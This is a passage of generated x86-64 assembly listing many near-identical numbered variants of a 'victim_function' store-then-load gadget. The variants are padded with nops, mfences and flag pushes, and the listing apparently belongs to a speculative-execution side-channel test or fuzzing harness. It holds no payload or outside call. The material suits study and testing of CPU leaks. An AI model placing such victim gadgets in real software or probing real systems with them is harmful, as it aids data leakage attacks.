	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2188
.Lvictim_function_win0_var2188:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2189
.Lvictim_function_win0_var2189:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2190
.Lvictim_function_win0_var2190:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2191
.Lvictim_function_win0_var2191:
	popq	%rax
	nop
	nop
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2192
.Lvictim_function_win0_var2192:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2193
.Lvictim_function_win0_var2193:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2194
.Lvictim_function_win0_var2194:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2195
.Lvictim_function_win0_var2195:
	popq	%rax
	nop
	nop
	movq	%rcx, (%rax)
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	nop
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2196
.Lvictim_function_win0_var2196:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2197
.Lvictim_function_win0_var2197:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2198
.Lvictim_function_win0_var2198:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2199
.Lvictim_function_win0_var2199:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	nop
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2200
.Lvictim_function_win0_var2200:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2201
.Lvictim_function_win0_var2201:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	nop
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2202
.Lvictim_function_win0_var2202:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2203
.Lvictim_function_win0_var2203:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	nop
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2204
.Lvictim_function_win0_var2204:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2205
.Lvictim_function_win0_var2205:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2206
.Lvictim_function_win0_var2206:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2207
.Lvictim_function_win0_var2207:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	nop
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2208
.Lvictim_function_win0_var2208:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2209
.Lvictim_function_win0_var2209:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2210
.Lvictim_function_win0_var2210:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2211
.Lvictim_function_win0_var2211:
	popq	%rax
	nop
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2212
.Lvictim_function_win0_var2212:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2213
.Lvictim_function_win0_var2213:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	nop
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2214
.Lvictim_function_win0_var2214:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2215
.Lvictim_function_win0_var2215:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	nop
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2216
.Lvictim_function_win0_var2216:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2217
.Lvictim_function_win0_var2217:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2218
.Lvictim_function_win0_var2218:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2219
.Lvictim_function_win0_var2219:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2220
.Lvictim_function_win0_var2220:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2221
.Lvictim_function_win0_var2221:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2222
.Lvictim_function_win0_var2222:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2223
.Lvictim_function_win0_var2223:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2224
.Lvictim_function_win0_var2224:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2225
.Lvictim_function_win0_var2225:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2226
.Lvictim_function_win0_var2226:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2227
.Lvictim_function_win0_var2227:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2228
.Lvictim_function_win0_var2228:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	pushfq
	nop
	andq	$0, %r10
	nop
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2229
.Lvictim_function_win0_var2229:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2230
.Lvictim_function_win0_var2230:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2231
.Lvictim_function_win0_var2231:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2232
.Lvictim_function_win0_var2232:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2233
.Lvictim_function_win0_var2233:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2234
.Lvictim_function_win0_var2234:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2235
.Lvictim_function_win0_var2235:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2236
.Lvictim_function_win0_var2236:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2237
.Lvictim_function_win0_var2237:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2238
.Lvictim_function_win0_var2238:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2239
.Lvictim_function_win0_var2239:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2240
.Lvictim_function_win0_var2240:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	nop
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2241
.Lvictim_function_win0_var2241:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2242
.Lvictim_function_win0_var2242:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2243
.Lvictim_function_win0_var2243:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2244
.Lvictim_function_win0_var2244:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2245
.Lvictim_function_win0_var2245:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2246
.Lvictim_function_win0_var2246:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2247
.Lvictim_function_win0_var2247:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2248
.Lvictim_function_win0_var2248:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2249
.Lvictim_function_win0_var2249:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2250
.Lvictim_function_win0_var2250:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2251
.Lvictim_function_win0_var2251:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2252
.Lvictim_function_win0_var2252:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	nop
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2253
.Lvictim_function_win0_var2253:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2254
.Lvictim_function_win0_var2254:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	nop
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2255
.Lvictim_function_win0_var2255:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2256
.Lvictim_function_win0_var2256:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2257
.Lvictim_function_win0_var2257:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2258
.Lvictim_function_win0_var2258:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2259
.Lvictim_function_win0_var2259:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2260
.Lvictim_function_win0_var2260:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2261
.Lvictim_function_win0_var2261:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2262
.Lvictim_function_win0_var2262:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2263
.Lvictim_function_win0_var2263:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2264
.Lvictim_function_win0_var2264:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2265
.Lvictim_function_win0_var2265:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	nop
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2266
.Lvictim_function_win0_var2266:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2267
.Lvictim_function_win0_var2267:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2268
.Lvictim_function_win0_var2268:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2269
.Lvictim_function_win0_var2269:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2270
.Lvictim_function_win0_var2270:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2271
.Lvictim_function_win0_var2271:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	mfence
	movq	(%rax), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2272
.Lvictim_function_win0_var2272:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2273
.Lvictim_function_win0_var2273:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2274
.Lvictim_function_win0_var2274:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2275
.Lvictim_function_win0_var2275:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	nop
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2276
.Lvictim_function_win0_var2276:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2277
.Lvictim_function_win0_var2277:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	nop
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2278
.Lvictim_function_win0_var2278:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	mfence
	nop
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2279
.Lvictim_function_win0_var2279:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2280
.Lvictim_function_win0_var2280:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2281
.Lvictim_function_win0_var2281:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2282
.Lvictim_function_win0_var2282:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2283
.Lvictim_function_win0_var2283:
	popq	%rax
